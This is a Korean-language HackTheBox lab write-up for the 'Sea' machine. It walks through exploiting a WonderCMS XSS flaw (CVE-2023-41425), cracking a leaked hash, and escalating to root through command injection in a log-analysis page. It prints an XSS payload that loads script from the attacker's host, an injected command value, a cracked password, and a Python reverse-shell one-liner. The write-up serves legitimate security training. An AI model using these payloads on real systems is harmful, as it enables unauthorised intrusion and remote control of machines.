# Sea - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA sea 10.129.21.196
```
<img width="1082" height="533" alt="image" src="https://github.com/user-attachments/assets/93a35500-3933-4a6d-a148-a2d022cf0325" />

- SSH(22)
- HTTP(80)

## HTTP
### banner grabbing
<img width="1082" height="389" alt="image" src="https://github.com/user-attachments/assets/8704f1c0-0434-437b-985b-3e9f8b9298b6" />

<br>
<br>

- 메인페이지에서 `HOW TO PARTICIPATE` 탭의 `contact`링크를 클릭해보니 `sea.htb/contact.php`로 연결됨.
<img width="427" height="43" alt="image" src="https://github.com/user-attachments/assets/1e7afbcd-cf2d-4d70-aca2-9c2facdcff21" />

<br>
<br>

- `/etc/hosts`에 `sea.htb`추가.
<img width="1083" height="72" alt="image" src="https://github.com/user-attachments/assets/433f2f05-bb2e-4906-8df5-84b043295033" />

---
### CVE-2023-41425
- `feroxbuster`를 사용하여 `README.md`와 `version` 경로 발견.
```bash
feroxbuster -u http://10.129.21.196 -x php,md,txt -C 404
```
<img width="1083" height="135" alt="image" src="https://github.com/user-attachments/assets/dc3eed9d-01da-43a4-bcd8-1a4df8473cef" />

<br>
<br>

- `WonderCMS 3.2.0`
<img width="489" height="82" alt="image" src="https://github.com/user-attachments/assets/4c56789e-1793-401a-9d8d-f094ed7eb061" />

<br>
<br>

<img width="489" height="82" alt="image" src="https://github.com/user-attachments/assets/745a26c6-7998-4b90-b391-4c54a97fe78d" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2023-41425
<img width="1206" height="462" alt="image" src="https://github.com/user-attachments/assets/e6ff17d5-dfcb-4e18-badf-8d8742df6064" />

<br>
<br>

- https://www.exploit-db.com/exploits/51805
```bash
searchsploit -m 51805
```
<img width="1084" height="209" alt="image" src="https://github.com/user-attachments/assets/561e6fa9-dea1-4fe6-b352-8b9d02ea31d3" />

<br>
<br>

- `xss.js`를 생성하여 XSS 공격을 시도한 후 셸을  획득하는 코드.
<img width="1084" height="337" alt="image" src="https://github.com/user-attachments/assets/619f90f6-2b68-43f5-9571-af5e9b83e79e" />

<br>
<br>

- `contact.php`에서 XSS 페이로드 테스트 성공.
```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.23"></script><form+action="
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/97b1a987-da11-4e5d-9930-0c3d6c45fdd6" />

<br>
<br>

<img width="1084" height="98" alt="image" src="https://github.com/user-attachments/assets/63796233-f68c-4859-925d-1cf08082e505" />

<br>
<br>

- `xss.js`코드 확인.
- `main.zip`으로 압축된 리버스 셸 코드를 다운로드 받아서 실행시키는 과정으로 보임.
<img width="1084" height="444" alt="image" src="https://github.com/user-attachments/assets/e9e90199-5264-4864-a527-66868ecade64" />

<br>
<br>

- `loginURL`로 수정.
<img width="1084" height="31" alt="image" src="https://github.com/user-attachments/assets/92a2fb14-37f5-4d93-8bbc-69bfd0f12654" />

<br>
<br>

- 로컬에 `main.zip`을 생성하여 로컬로 접속하여 다운로드 받도록 코드를 수정.
<img width="1084" height="48" alt="image" src="https://github.com/user-attachments/assets/9755fa9a-0e5a-4bed-b0e2-a190554bc3f4" />

<br>
<br>

- IP와 PORT 수정.
<img width="1084" height="48" alt="image" src="https://github.com/user-attachments/assets/96c2a3b4-678f-4965-b03c-70f6625fb7ab" />

<br>
<br>

- `xss.js`를 요청하도록 페이로드를 수정하여 전달.
```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.23:8000/xss.js"></script><form+action="
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/6e66b4cf-2278-4b2a-b8fe-105e1dc2c497" />

<br>
<br>

- `xss.js`는 요청이 되었으나 `main.zip`은 요청이 되질 않음.
<img width="1084" height="95" alt="image" src="https://github.com/user-attachments/assets/260e3a6d-7cf3-420e-91c4-3fe7f6aa1ccb" />

<br>
<br>

- 브라우저 콘솔로 코드를 테스트.
- `urlWithoutLog`는 `sea.htb`를 출력하는데 `urlWithoutLogBase`는 `/`만 출력하도록 되어 있음.
<img width="454" height="185" alt="image" src="https://github.com/user-attachments/assets/7ae56167-281e-4748-859e-b6256f2f3dd5" />

<br>
<br>

- `xss.js`에서 `urlWithoutLogBase`를 `urlWithoutLog`로 변경.
<img width="1086" height="422" alt="image" src="https://github.com/user-attachments/assets/89c7bcb8-bec9-49ae-aa6e-2c3b2d42b029" />

<br>
<br>

- `main.zip`요청 성공.
<img width="1086" height="204" alt="image" src="https://github.com/user-attachments/assets/e95442d9-6ada-40a3-96c1-3bdaac6b427e" />

<br>
<br>

- 셸 획득.
<img width="1086" height="247" alt="image" src="https://github.com/user-attachments/assets/bce2cb03-0f0e-4992-b18d-b4745264625e" />

---
## Shell as amay
- `/var/www/sea/data`경로에서 `database.js` 발견.
- 해시 노출.
<img width="1086" height="249" alt="image" src="https://github.com/user-attachments/assets/3ab2c31a-9a8f-4ccb-8935-cf350bfe45b6" />

<br>
<br>

- 크래킹을 시도해보았으나 실패.
- 해시에서 `\`를 제외한 후 다시 크래킹 시도하여 성공.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1086" height="119" alt="image" src="https://github.com/user-attachments/assets/77b0506a-8d86-4185-9e88-4b57b921284b" />

<br>
<br>

- `amay`와 `geo`유저 발견.
<img width="1086" height="92" alt="image" src="https://github.com/user-attachments/assets/2be0eb1b-2de8-42d2-995e-fc2ff45a4e61" />

<br>
<br>

- `amay:mychemicalromance` 로그인 성공.
<img width="1086" height="92" alt="image" src="https://github.com/user-attachments/assets/49f2f9e0-41c1-4ace-80d6-abc0cc00dfd9" />

<br>
<br>

- SSH 접속.
```bash
ssh amay@10.129.22.16
```
<img width="1086" height="49" alt="image" src="https://github.com/user-attachments/assets/509bccf3-baf8-4cf1-ade5-d7a1b4421d3d" />

---
## Privesc
- `8080` 포트 발견.
<img width="1086" height="156" alt="image" src="https://github.com/user-attachments/assets/fd1be538-07c5-4cb3-8f8b-0494f7362644" />

<br>
<br>

- 포트포워딩 생성.
```bash
ssh -L 8000:localhost:8080 amay@10.129.22.21
```
<img width="1086" height="124" alt="image" src="https://github.com/user-attachments/assets/ed87eefa-6cc0-4a2c-9d3c-95b99569913d" />

<br>
<br>

- `amay:mychemicalromance` 로그인 시도하여 성공.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/a8049bfa-25d5-44db-b985-b774993cd7e5" />

<br>
<br>

- `auth.log`를 선택하여 분석 버튼을 누르면 `root`로 로그인이 된 상태에서 실행이 되는 것으로 보임.
<img width="828" height="442" alt="image" src="https://github.com/user-attachments/assets/9e76ab9e-4419-439a-ac97-2b8a40a807d0" />

<br>
<br>

- `burpsuite`로 가로채서 `log_file`을 변경해보니 LFI가 가능.
<img width="1547" height="710" alt="image" src="https://github.com/user-attachments/assets/2d2a2abb-679b-4573-9ce2-3018dd7b533e" />

<br>
<br>

- Command Injection이 되는지 확인하기 위해 ping test 시도.
```
/etc/passwd;ping 10.10.14.23
```
<img width="775" height="468" alt="image" src="https://github.com/user-attachments/assets/e55206d2-bf6e-49ae-8deb-3c9543fb18d5" />

<br>
<br>

- ping test 성공.
<img width="1085" height="246" alt="image" src="https://github.com/user-attachments/assets/ceb4b931-2e3f-463f-ae42-5c42336dfe54" />

<br>
<br>

- 파이썬 리버스 셸 명령어 실행.
```
;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.23",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
<img width="772" height="525" alt="image" src="https://github.com/user-attachments/assets/f6ac9889-4825-4362-a21d-038c610248fb" />

<br>
<br>

- 셸 획득.
<img width="1085" height="158" alt="image" src="https://github.com/user-attachments/assets/1b96b161-1966-4438-9244-7fbb6ff68c1e" />

---
## FLAG
- `/home/amay/user.txt`
<img width="1085" height="244" alt="image" src="https://github.com/user-attachments/assets/b5f68fdc-07ad-4be8-8cee-6192528b5e79" />

<br>
<br>

- `/root/root.txt`
<img width="1085" height="309" alt="image" src="https://github.com/user-attachments/assets/ae0194ea-3382-4677-b575-ee13a312cb4d" />
